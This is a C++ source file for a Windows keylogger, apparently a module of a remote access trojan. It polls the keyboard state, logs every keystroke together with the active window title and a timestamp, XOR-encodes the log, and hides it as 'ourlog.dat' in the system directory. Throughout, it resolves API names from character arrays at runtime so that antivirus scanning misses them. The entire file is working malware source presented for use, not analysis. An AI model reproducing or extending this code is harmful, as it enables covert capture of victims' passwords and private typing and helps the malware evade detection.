
#include "../Declare.h"   //动态调用库函数

/////////////////////////////////////////////////////////////////////////////////////////////////

void SaveToFile(CHAR *lpBuffer)
{
	char keylog[] = {'\\','o','u','r','l','o','g','.','d','a','t','\0'};
	CHAR	strRecordFile[MAX_PATH];
	char Mstvw01[] = {'G','e','t','S','y','s','t','e','m','D','i','r','e','c','t','o','r','y','A','\0'};
	GetSystemDirectoryAT pGetSystemDirectoryA=(GetSystemDirectoryAT)GetProcAddress(LoadLibrary("KERNEL32.dll"),Mstvw01);
	pGetSystemDirectoryA(strRecordFile, sizeof(strRecordFile));
	char DmDjm01[] = {'l','s','t','r','c','a','t','A','\0'};
	lstrcatAT plstrcatA=(lstrcatAT)GetProcAddress(LoadLibrary("KERNEL32.dll"),DmDjm01);
	plstrcatA(strRecordFile, keylog);
	char HvnXs01[] = {'C','r','e','a','t','e','F','i','l','e','A','\0'};
	CreateFileAT pCreateFileA=(CreateFileAT)GetProcAddress(LoadLibrary("KERNEL32.dll"),HvnXs01);
	HANDLE	hFile = pCreateFileA(strRecordFile, GENERIC_WRITE, FILE_SHARE_WRITE,
		NULL, OPEN_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
	DWORD dwBytesWrite = 0;
	char Wffkl09[] = {'G','e','t','F','i','l','e','S','i','z','e','\0'};
	GetFileSizeT pGetFileSize=(GetFileSizeT)GetProcAddress(LoadLibrary("KERNEL32.dll"),Wffkl09);
	DWORD dwSize = pGetFileSize(hFile, NULL);
	char Wffkl05[] = {'S','e','t','F','i','l','e','P','o','i','n','t','e','r','\0'};
	SetFilePointerT pSetFilePointer=(SetFilePointerT)GetProcAddress(LoadLibrary("KERNEL32.dll"),Wffkl05);
	if (dwSize < 1024 * 1024 * 50)
		pSetFilePointer(hFile, 0, 0, FILE_END);
	// 加密
	char FBwWp01[] = {'l','s','t','r','l','e','n','A','\0'};
	lstrlenAT plstrlenA=(lstrlenAT)GetProcAddress(LoadLibrary("KERNEL32.dll"),FBwWp01);
	int	nLength = plstrlenA(lpBuffer);
	LPBYTE	lpEncodeBuffer = new BYTE[nLength];
	for (int i = 0; i < nLength; i++)
		lpEncodeBuffer[i] = lpBuffer[i] ^ 98;

	char HvnXs02[] = {'W','r','i','t','e','F','i','l','e','\0'};
	WriteFileT pWriteFile=(WriteFileT)GetProcAddress(LoadLibrary("KERNEL32.dll"),HvnXs02);
	pWriteFile(hFile, lpEncodeBuffer, plstrlenA(lpBuffer), &dwBytesWrite, NULL);
	char BrmAP29[] = {'C','l','o','s','e','H','a','n','d','l','e','\0'};
	CloseHandleT pCloseHandle=(CloseHandleT)GetProcAddress(LoadLibrary("KERNEL32.dll"),BrmAP29);
	pCloseHandle(hFile);	
	
	return ;
}

char *LowerCase[]=
{
	    "[Backspace]",
		"[Tab]",
		"[Clear]", 
		"[Enter]",
		"[Shift]",
		"[Ctrl]",
		"[Alt]",
		"[Pause]", 
		"[CapsLock]", 
		"[Esc]",
		"[Space]", 
		"[PageUp]", 
		"[PageDown]", 
		"[End]",
		"[Home]", 
		"[LeftArrow]", 
		"[UpArrow]",
		"[RightArrow]", 
		"[DownArrow]", 
		"[Select]",
		"[Print]",
		"[Execute]",
		"[Snapshot]",
		"[Insert]",
		"[Delete]",
		"[Help]", 
		"0", 
		"1", 
		"2",
		"3", 
		"4", 
		"5", 
		"6", 
		"7", 
		"8", 
		"9", 
		"a", 
		"b", 
		"c", 
		"d", 
		"e", 
		"f", 
		"g", 
		"h", 
		"i", 
		"j", 
		"k", 
		"l", 
		"m", 
		"n", 
		"o", 
		"p", 
		"q", 
		"r", 
		"s", 
		"t", 
		"u", 
		"v", 
		"w", 
		"x", 
		"y", 
		"z", 
		"0",
		"1", 
		"2", 
		"3", 
		"4",
		"5",
		"6", 
		"7", 
		"8",
		"9", 
		"*", 
		"+", 
		"[Enter]", 
		"-",
		".", 
		"/", 
		"[F1]", 
		"[F2]", 
		"[F3]", 
		"[F4]", 
		"[F5]", 
		"[F6]", 
		"[F7]", 
		"[F8]", 
		"[F9]", 
		"[F10]", 
		"[F11]",
		"[F12]", 
		"[Num Lock]", 
        "[Scroll]",
		"."
};


char *UpperCase[]=
{
	
    	"[Backspace]",
		"[Tab]",
		"[Clear]", 
		"[Enter]",
		"[Shift]",
		"[Ctrl]",
		"[Alt]",
		"[Pause]", 
		"[CapsLock]", 
		"[Esc]",
		"[Space]", 
		"[PageUp]", 
		"[PageDown]", 
		"[End]",
		"[Home]", 
		"[LeftArrow]", 
		"[UpArrow]",
		"[RightArrow]", 
		"[DownArrow]", 
		"[Select]",
		"[Print]",
		"[Execute]",
		"[Snapshot]",
		"[Insert]",
		"[Delete]",
		"[Help]", 
		"0", 
		"1", 
		"2",
		"3", 
		"4", 
		"5", 
		"6", 
		"7", 
		"8", 
		"9", 
		"A", 
		"B", 
		"C", 
		"D", 
		"E", 
		"F", 
		"G", 
		"H", 
		"I", 
		"J", 
		"K", 
		"L", 
		"M", 
		"N", 
		"O", 
		"P", 
		"Q", 
		"R", 
		"S", 
		"T", 
		"U", 
		"V", 
		"W", 
		"X", 
		"Y", 
		"Z", 
		"0",
		"1", 
		"2", 
		"3", 
		"4",
		"5",
		"6", 
		"7", 
		"8",
		"9", 
		"*", 
		"+", 
		"[Enter]", 
		"-",
		".", 
		"/", 
		"[F1]", 
		"[F2]", 
		"[F3]", 
		"[F4]", 
		"[F5]", 
		"[F6]", 
		"[F7]", 
		"[F8]", 
		"[F9]", 
		"[F10]", 
		"[F11]",
		"[F12]", 
		"[Num Lock]", 
        "[Scroll]",
		"."
};

int SpecialKeys[]=
{
	8,//Backspace!
		9,//Tab!
		12,//Clear! 
		13,//Enter!
		16,//Shift!
		17,//Ctrl!
		18,//Alt!
		19,//Pause! 
		20,//Caps Lock! 
		27,//Esc!
		32,//Space! 
		33,//Page Up! 
		34,//Page Down! 
		35,//End!
		36,//Home! 
		37,//Left Arrow! 
		38,//Up Arrow!
		39,//Right Arrow! 
		40,//Down Arrow! 
		41,//Select!
		42,//Print!
		43,//Execute!
		44,//Snapshot!
		45,//Insert!
		46,//Delete!
		47,//Help! 
		48,//0! 
		49,//1! 
		50,//2!
		51,//3! 
		52,//4! 
		53,//5! 
		54,//6! 
		55,//7! 
		56,//8! 
		57,//9! 
		65,//A! 
		66,//B! 
		67,//C! 
		68,//D! 
		69,//E! 
		70,//F! 
		71,//G! 
		72,//H! 
		73,//I! 
		74,//J! 
		75,//K! 
		76,//L! 
		77,//M! 
		78,//N! 
		79,//O! 
		80,//P! 
		81,//Q! 
		82,//R! 
		83,//S! 
		84,//T! 
		85,//U! 
		86,//V! 
		87,//W! 
		88,//X! 
		89,//Y! 
		90,//Z! 
		96,//0!
		97,//1! 
		98,//2! 
		99,//3! 
		100,//4!
		101,//5!
		102,//6! 
		103,//7! 
		104,//8!
		105,//9! 
		106,//*! 
		107,//+! 
		108,//Enter! 
		109,//-!
		110,//.! 
		111,///! 
		112,//F1! 
		113,//F2! 
		114,//F3! 
		115,//F4! 
		116,//F5! 
		117,//F6! 
		118,//F7! 
		119,//F8! 
		120,//F9! 
		121,//F10! 
		122,//F11!
		123,//F12! 
		144,//Num Lock! 
		145,//Scroll! 
		190,
};

HWND PreviousFocus=NULL;
CHAR WindowCaption[1024]={0};
HWND hFocus = NULL;
BOOL IsWindowsFocusChange()
{

    char CtxPW50[] = {'w','s','p','r','i','n','t','f','A','\0'};
    wsprintfAT pwsprintfA=(wsprintfAT)GetProcAddress(LoadLibrary("USER32.dll"),CtxPW50);
    char CtxPW56[] = {'G','e','t','W','i','n','d','o','w','T','e','x','t','A','\0'};
    GetWindowTextAT pGetWindowTextA=(GetWindowTextAT)GetProcAddress(LoadLibrary("USER32.dll"),CtxPW56);
	char FBwWp01[] = {'l','s','t','r','l','e','n','A','\0'};
	lstrlenAT plstrlenA=(lstrlenAT)GetProcAddress(LoadLibrary("KERNEL32.dll"),FBwWp01);
	char DYrEN53[] = {'G','e','t','F','o','r','e','g','r','o','u','n','d','W','i','n','d','o','w','\0'};
	GetForegroundWindowT pGetForegroundWindow=(GetForegroundWindowT)GetProcAddress(LoadLibrary("USER32.dll"),DYrEN53);
				//	memset(hFocus,0,sizeof(hFocus));
				memset(WindowCaption,0,sizeof(WindowCaption));
				hFocus = pGetForegroundWindow(); 
				pGetWindowTextA(hFocus,WindowCaption,sizeof(WindowCaption));
				
				
				BOOL ReturnFlag = FALSE; 
				CHAR temp[1024]={0};
				if (hFocus == PreviousFocus) 
				{	 
					
				}
				else
				{
					if (plstrlenA(WindowCaption) > 0)
					{
						SYSTEMTIME   s;  
						char FBwWp11[] = {'G','e','t','L','o','c','a','l','T','i','m','e','\0'};
	                    GetLocalTimeT pGetLocalTime=(GetLocalTimeT)GetProcAddress(LoadLibrary("KERNEL32.dll"),FBwWp11);
						pGetLocalTime(&s);  
						pwsprintfA(temp,"\r\n[标题:] %s\r\n[时间:]%d-%d-%d  %d:%d:%d\r\n",WindowCaption,s.wYear,s.wMonth,s.wDay,s.wHour,s.wMinute,s.wSecond);
						SaveToFile(temp);
						memset(temp,0,sizeof(temp));
						memset(WindowCaption,0,sizeof(WindowCaption)); 
						ReturnFlag=TRUE; 
					}
					PreviousFocus = hFocus;
				}
				return ReturnFlag; 
}

DWORD WINAPI KeyLogger(LPARAM lparam)
{
	int bKstate[256] = {0}; 
	int i,x;
	CHAR KeyBuffer[600]; 
	int state; 
	int shift; 
	memset(KeyBuffer,0,sizeof(KeyBuffer));
	char DmDjm01[] = {'l','s','t','r','c','a','t','A','\0'};
	lstrcatAT plstrcatA=(lstrcatAT)GetProcAddress(LoadLibrary("KERNEL32.dll"),DmDjm01);
	char FBwWp01[] = {'l','s','t','r','l','e','n','A','\0'};
	lstrlenAT plstrlenA=(lstrlenAT)GetProcAddress(LoadLibrary("KERNEL32.dll"),FBwWp01);

    char FBwWp25[] = {'S','l','e','e','p','\0'};
    SleepT pSleep=(SleepT)GetProcAddress(LoadLibrary("KERNEL32.dll"),FBwWp25);

	char DYrEN53[] = {'G','e','t','A','s','y','n','c','K','e','y','S','t','a','t','e','\0'};
	GetAsyncKeyStateT pGetAsyncKeyState=(GetAsyncKeyStateT)GetProcAddress(LoadLibrary("USER32.dll"),DYrEN53);
	char DYrEN55[] = {'G','e','t','K','e','y','S','t','a','t','e','\0'};
	GetKeyStateT pGetKeyState=(GetKeyStateT)GetProcAddress(LoadLibrary("USER32.dll"),DYrEN55);
	while(TRUE)
	{
		pSleep(8); 
		if (plstrlenA(KeyBuffer) != 0) 
		{
			if (IsWindowsFocusChange())
			{
				plstrcatA(KeyBuffer,"\n");
				SaveToFile("[内容:]");
//				lstrcat(KeyBuffer,"\n");
				SaveToFile(KeyBuffer);
				memset(KeyBuffer,0,sizeof(KeyBuffer));
			}
			else
			{
				plstrcatA(KeyBuffer,"\n");
				SaveToFile(KeyBuffer);
				memset(KeyBuffer,0,sizeof(KeyBuffer));
			}
		}
		
		for(i=0;i<93;i++) 
		{
			shift = pGetKeyState(VK_SHIFT); 
			x = SpecialKeys[ i ]; 
			if (pGetAsyncKeyState(x) & 0x8000) 
			{
				if (((pGetKeyState(VK_CAPITAL) != 0) && (shift > -1) && (x > 64) && (x < 91))) //Caps Lock And Shift Is Not Pressed
				{
					bKstate[x] = 1; 
				}
				else
					if (((pGetKeyState(VK_CAPITAL) != 0) && (shift < 0) && (x > 64) && (x < 91))) //Caps Lock And Shift Is Pressed
					{
						bKstate[x] = 2; 
					}
					else
						if (shift < 0) 
						{
							bKstate[x] = 3; 
						}
						else
							bKstate[x] = 4; 
			}
			else
			{
				if (bKstate[x] != 0) 
				{
					state = bKstate[x]; 
					bKstate[x] = 0;
					if (x == 8) 
					{
						KeyBuffer[plstrlenA(KeyBuffer) - 1] = 0;
						continue;
					}
					if (x==106)
					{
						plstrcatA(KeyBuffer,"*\r\n");
						SaveToFile(KeyBuffer);
						memset(KeyBuffer,0,sizeof(KeyBuffer)); 
						continue; 
					}
					else
						if (plstrlenA(KeyBuffer) > 550) 
						{
							SaveToFile(KeyBuffer);
							memset(KeyBuffer,0,sizeof(KeyBuffer)); 
							continue;
						}
						else
							if (x == 13) 
							{
								plstrcatA(KeyBuffer,"<Enter>\r\n");
								SaveToFile(KeyBuffer);
								memset(KeyBuffer,0,sizeof(KeyBuffer)); 
								continue; 
							}
							else
							{
								if ((state%2) == 1) 
								{
								plstrcatA(KeyBuffer,(CHAR *)UpperCase[ i ]);
									
								}
								else if ((state%2) == 0) 
								{
								plstrcatA(KeyBuffer,(CHAR *)LowerCase[ i ]); 
								}
							}
				}
			}
		}
		
	}
	return 0; 
}
